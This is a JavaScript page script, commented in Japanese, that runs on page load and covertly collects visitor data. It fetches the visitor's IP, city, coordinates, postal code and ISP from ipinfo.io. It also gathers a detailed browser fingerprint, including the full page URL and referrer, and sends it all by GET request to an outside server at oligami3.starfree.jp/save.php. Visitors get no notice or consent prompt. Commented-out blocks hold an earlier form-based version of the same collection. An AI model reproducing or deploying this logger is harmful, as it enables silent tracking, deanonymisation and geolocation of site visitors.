window.onload = async function() {
  // window.navigator.vibrate([100,30,100,30,100,30,200,30,200,30,200,30,100,30,100,30,100]); // モールス信号で 'SOS' とバイブレーション
  // var top = window.innerHeight;
  // var right = window.innerWidth;

  /*var newWindow = window.open("https://teams.microsoft.com/_#/apps", "null", 'top=-10,left=-10,width=10,height=10');
  var newWindow = window.open("https://www.bing.com/work/search?q=%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC&qs=n&form=QBRE&msbsrank=0_2_Person_2&sp=-1&pq=a&sc=2-1&sk=&cvid=BF6200994487484F833ACDA72F6EDBF5", "null");
  if( newWindow ) {
    console.log('正常に開きました');
  }
  else {
    console.log('正常に開けませんでした！');
    newWindow.close();
  }*/
  const request = await fetch("https://ipinfo.io/json");
  const ip = await request.json();
  submitForm(ip);
};

async function submitForm (ip) {
  // form を動的に生成
  // var form = document.createElement('form');
  // form.action = 'http://oligami3.starfree.jp/save.php';
  // form.method = 'GET';

  // body に追加
  // document.body.append(form);
  // formdata イベントに関数を登録(submit する直前に発火)
  /*form.addEventListener('formdata', (e) => {
    var fd = e.formData;

    // データをセット
    fd.set('location.host', location.host); // ホスト情報
    fd.set('location.hostname', location.hostname); // ホスト名
    fd.set('location.port', location.port); // ポート番号
    fd.set('location.url', location.href); // URL
    fd.set('location.search', location.search); // パラメータ（サーチ）
    fd.set('location.protocol', location.protocol); // プロトコル
    fd.set('location.hash', location.hash); // パラメータ（ハッシュ）
    fd.set('location.path', location.pathname); // ページURLのパス部分
    fd.set('location.origin', location.origin); // プロトコル・ポート情報を含めたURL
    fd.set('navigator.appName', navigator.appName); // ブラウザ名 正確かは不明
    fd.set('navigator.appCodeName', navigator.appCodeName); // ブラウザのコード名 正確かは不明
    fd.set('navigator.buildID', navigator.buildID); // 今は固定
    fd.set('navigator.productSub', navigator.productSub); // ビルド番号
    fd.set('navigator.cookieEnabled', navigator.cookieEnabled); // クッキーの許可
    fd.set('navigator.deviceMemory', navigator.deviceMemory); // 端末のメモリGB
    fd.set('navigator.doNotTrack', navigator.doNotTrack); // do-not-track 設定
    fd.set('navigator.hardwareConcurrency', navigator.hardwareConcurrency); // 論理プロセッサーコア数
    fd.set('navigator.appVersion', navigator.appVersion); // ブラウザバージョン 正確かは不明
    fd.set('navigator.appMinorVersion', navigator.appMinorVersion); // ブラウザMinorバージョン
    fd.set('navigator.cpuClass', navigator.cpuClass); // cpuClass
    fd.set('navigator.oscpu', navigator.oscpu); // oscpu
    i = 0;
    for (item in navigator.plugins) {
      fd.set('navigator.plugins' + i, +  item); // プラグイン 廃止済み
      i++;
    }
    fd.set('navigator.language', navigator.language); // ブラウザの仕様言語
    fd.set('navigator.userLanguage', navigator.userLanguage); // ブラウザのユーザー用言語
    fd.set('navigator.systemLanguage', navigator.systemLanguage); // ブラウザのsystem用言語
    fd.set('navigator.browserLanguage', navigator.browserLanguage); // ブラウザのbrowser用言語
    fd.set('navigator.pratform', navigator.platform); // ブラウザのplatform
    fd.set('navigator.userAgent', navigator.userAgent); // ブラウザのuserAgent
    fd.set('navigator.vendor', navigator.vendor); // vendor
    fd.set('navigator.vendorSub', navigator.vendorSub); // vendorSub vendor version number を返す
    fd.set('document.referrer', document.referrer); // リファラー
    fd.set('document.domain', document.domain); // ドメイン
    fd.set('screen.width', screen.width); // スクリーンの幅
    fd.set('screen.height', screen.height); // スクリーンの高さ
    fd.set('screen.colorDepth', screen.colorDepth); // スクリーンの色深度
    fd.set('window.innerWidth', window.innerWidth); // ブラウザのビューポートの幅
    fd.set('window.innerHeight', window.innerHeight); // ブラウザのビューポートの高さ
    fd.set('window.devicePixelRatio', window.devicePixelRatio); // ブラウザのビューポートの高さ
    fd.set('navigator.pointerEnabled', navigator.pointerEnabled); // タッチ操作可能
    fd.set('navigator.maxTouchPoints', navigator.maxTouchPoints); // 最大同時タッチ数
    fd.set('navigator.onLine', navigator.onLine); // ネットワーク
    fd.set('ipinfo.city', ip.city); //
    fd.set('ipinfo.country', ip.country); //
    fd.set('ipinfo.hostname', ip.hostname); //
    fd.set('ipinfo.ip', ip.ip); // IP
    fd.set('ipinfo.loc', ip.loc); //
    fd.set('ipinfo.org', ip.org); //
    fd.set('ipinfo.postal', ip.postal); //
    fd.set('ipinfo.region', ip.region); //
    fd.set('ipinfo.timezone', ip.timezone); //
    fd.set('dateAndTime', getParameter()["dateAndTime"]);
  });*/

  // submit
  // form.submit();

  var url = 'http://oligami3.starfree.jp/save.php?' +
  'location.host' + '=' + location.host + '&' + // ホスト情報
  'location.hostname' + '=' + location.hostname + '&' + // ホスト名
  'location.port' + '=' + location.port + '&' + // ポート番号
  'location.url' + '=' + location.href + '&' + // URL
  'location.search' + '=' + location.search + '&' + // パラメータ（サーチ）
  'location.protocol' + '=' + location.protocol + '&' + // プロトコル
  'location.hash' + '=' + location.hash + '&' + // パラメータ（ハッシュ）
  'location.path' + '=' + location.pathname + '&' + // ページURLのパス部分
  'location.origin' + '=' + location.origin + '&' + // プロトコル・ポート情報を含めたURL
  'navigator.appName' + '=' + navigator.appName + '&' + // ブラウザ名 正確かは不明
  'navigator.appCodeName' + '=' + navigator.appCodeName + '&' + // ブラウザのコード名 正確かは不明
  'navigator.buildID' + '=' + navigator.buildID + '&' + // 今は固定
  'navigator.productSub' + '=' + navigator.productSub + '&' + // ビルド番号
  'navigator.cookieEnabled' + '=' + navigator.cookieEnabled + '&' + // クッキーの許可
  'navigator.deviceMemory' + '=' + navigator.deviceMemory + '&' + // 端末のメモリGB
  'navigator.doNotTrack' + '=' + navigator.doNotTrack + '&' + // do-not-track 設定
  'navigator.hardwareConcurrency' + '=' + navigator.hardwareConcurrency + '&' + // 論理プロセッサーコア数
  'navigator.appVersion' + '=' + navigator.appVersion + '&' + // ブラウザバージョン 正確かは不明
  'navigator.appMinorVersion' + '=' + navigator.appMinorVersion + '&' + // ブラウザMinorバージョン
  'navigator.cpuClass' + '=' + navigator.cpuClass + '&' + // cpuClass
  'navigator.oscpu' + '=' + navigator.oscpu + '&';// oscpu
  i = 0;
  for (item in navigator.plugins) {
    url = url + 'navigator.plugins' + i + '=' +  item + '&'; // プラグイン 廃止済み
    i++;
  }
  url = url +
  'navigator.language' + '=' + navigator.language + '&' + // ブラウザの仕様言語
  'navigator.userLanguage' + '=' + navigator.userLanguage + '&' + // ブラウザのユーザー用言語
  'navigator.systemLanguage' + '=' + navigator.systemLanguage + '&' + // ブラウザのsystem用言語
  'navigator.browserLanguage' + '=' + navigator.browserLanguage + '&' + // ブラウザのbrowser用言語
  'navigator.pratform' + '=' + navigator.platform + '&' + // ブラウザのplatform
  'navigator.userAgent' + '=' + navigator.userAgent + '&' + // ブラウザのuserAgent
  'navigator.vendor' + '=' + navigator.vendor + '&' + // vendor
  'navigator.vendorSub' + '=' + navigator.vendorSub + '&' + // vendorSub vendor version number を返す
  'document.referrer' + '=' + document.referrer + '&' + // リファラー
  'document.domain' + '=' + document.domain + '&' + // ドメイン
  'screen.width' + '=' + screen.width + '&' + // スクリーンの幅
  'screen.height' + '=' + screen.height + '&' + // スクリーンの高さ
  'screen.colorDepth' + '=' + screen.colorDepth + '&' + // スクリーンの色深度
  'window.innerWidth' + '=' + window.innerWidth + '&' + // ブラウザのビューポートの幅
  'window.innerHeight' + '=' + window.innerHeight + '&' + // ブラウザのビューポートの高さ
  'window.devicePixelRatio' + '=' + window.devicePixelRatio + '&' + // ブラウザのビューポートの高さ
  'navigator.pointerEnabled' + '=' + navigator.pointerEnabled + '&' + // タッチ操作可能
  'navigator.maxTouchPoints' + '=' + navigator.maxTouchPoints + '&' + // 最大同時タッチ数
  'navigator.onLine' + '=' + navigator.onLine + '&' + // ネットワーク
  'ipinfo.city' + '=' + ip.city + '&' + //
  'ipinfo.country' + '=' + ip.country + '&' + //
  'ipinfo.hostname' + '=' + ip.hostname + '&' + //
  'ipinfo.ip' + '=' + ip.ip + '&' + // IP
  'ipinfo.loc' + '=' + ip.loc + '&' + //
  'ipinfo.org' + '=' + ip.org + '&' + //
  'ipinfo.postal' + '=' + ip.postal + '&' + //
  'ipinfo.region' + '=' + ip.region + '&' + //
  'ipinfo.timezone' + '=' + ip.timezone + '&' + //
  'dateAndTime' + '=' + getParameter()["dateAndTime"];
  fetch(url);
}

function getParameter(){
	var paramsArray = [];
	var url = location.href;
	var parameters = url.split("#");
	if( parameters.length > 1 ) url = parameters[0];
  parameters = url.split("?");
	if( parameters.length > 1 ) {
		var params	 = parameters[1].split("&amp;");
		for ( i = 0; i < params.length; i++ ) {
		   var paramItem = params[i].split("=");
		   paramsArray[paramItem[0]] = paramItem[1];
		}
	}
	return paramsArray;
};
